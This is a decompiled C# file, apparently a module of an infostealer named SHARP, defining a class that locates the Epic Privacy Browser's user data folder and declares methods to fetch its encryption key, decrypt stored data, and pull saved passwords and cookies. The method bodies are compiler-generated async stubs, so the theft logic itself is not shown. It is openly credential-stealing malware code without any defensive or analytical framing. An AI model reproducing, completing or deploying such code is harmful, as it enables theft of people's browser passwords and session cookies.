﻿using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;

namespace SHARP
{
	// Token: 0x02000021 RID: 33
	internal static class EpicPrivacy
	{
		// Token: 0x060000C2 RID: 194 RVA: 0x000052A8 File Offset: 0x000034A8
		private static Task<byte[]> GetEncryptionKey()
		{
			EpicPrivacy.<GetEncryptionKey>d__3 <GetEncryptionKey>d__;
			<GetEncryptionKey>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<GetEncryptionKey>d__.<>1__state = -1;
			<GetEncryptionKey>d__.<>t__builder.Start<EpicPrivacy.<GetEncryptionKey>d__3>(ref <GetEncryptionKey>d__);
			return <GetEncryptionKey>d__.<>t__builder.Task;
		}

		// Token: 0x060000C3 RID: 195 RVA: 0x000052E4 File Offset: 0x000034E4
		private static Task<byte[]> DecryptData(byte[] buffer)
		{
			EpicPrivacy.<DecryptData>d__4 <DecryptData>d__;
			<DecryptData>d__.<>t__builder = AsyncTaskMethodBuilder<byte[]>.Create();
			<DecryptData>d__.buffer = buffer;
			<DecryptData>d__.<>1__state = -1;
			<DecryptData>d__.<>t__builder.Start<EpicPrivacy.<DecryptData>d__4>(ref <DecryptData>d__);
			return <DecryptData>d__.<>t__builder.Task;
		}

		// Token: 0x060000C4 RID: 196 RVA: 0x00005328 File Offset: 0x00003528
		internal static Task<PasswordFormat[]> GetPasswords()
		{
			EpicPrivacy.<GetPasswords>d__5 <GetPasswords>d__;
			<GetPasswords>d__.<>t__builder = AsyncTaskMethodBuilder<PasswordFormat[]>.Create();
			<GetPasswords>d__.<>1__state = -1;
			<GetPasswords>d__.<>t__builder.Start<EpicPrivacy.<GetPasswords>d__5>(ref <GetPasswords>d__);
			return <GetPasswords>d__.<>t__builder.Task;
		}

		// Token: 0x060000C5 RID: 197 RVA: 0x00005364 File Offset: 0x00003564
		internal static Task<CookieFormat[]> GetCookies()
		{
			EpicPrivacy.<GetCookies>d__6 <GetCookies>d__;
			<GetCookies>d__.<>t__builder = AsyncTaskMethodBuilder<CookieFormat[]>.Create();
			<GetCookies>d__.<>1__state = -1;
			<GetCookies>d__.<>t__builder.Start<EpicPrivacy.<GetCookies>d__6>(ref <GetCookies>d__);
			return <GetCookies>d__.<>t__builder.Task;
		}

		// Token: 0x0400004F RID: 79
		private static readonly string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Epic Privacy Browser", "User Data");

		// Token: 0x04000050 RID: 80
		private static byte[] _encryptionKey = null;
	}
}
